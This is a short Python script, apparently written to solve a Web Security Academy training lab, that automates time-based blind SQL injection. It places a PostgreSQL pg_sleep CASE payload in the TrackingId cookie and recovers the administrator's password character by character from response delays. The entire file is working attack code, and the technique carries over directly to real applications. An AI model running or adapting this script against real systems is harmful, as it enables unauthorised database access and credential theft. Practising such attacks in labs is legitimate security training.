import requests
import time

# Add unique code of the lab, tracking id and session id 
params = {"category": "Accessories"}
char = "abcdefghijklmnopqrstuvwxyz0123456789"
unique_code_url = "0a7d009004184dea8179e06a00fa0021"
url = f"https://{unique_code_url}.web-security-academy.net/filter"
password = []

for count in range(1, 21):
    for chr in char:
        headers = {
            "Host": f"{unique_code_url}.web-security-academy.net",
            "Cookie": f"TrackingId='  || ( select case when(substr(password,{count},1) = '{chr}') then  pg_sleep(5)  else pg_sleep(0) end from users where username='administrator' ) --; session=jteHmPE7f9n61CmZDxlCdWUVXh55ErF2",
            "Sec-Ch-Ua": '"Not_A Brand";v="99", "Chromium";v="104"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"https://{unique_code_url}.web-security-academy.net/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
        }

        response = requests.get(url, headers=headers, params=params).elapsed.total_seconds()

        print(f"{count},1 = {chr}")
        print(response)
        if response >=5:
            password.append(chr)
            print(f"Password found: {''.join(password)}")
            break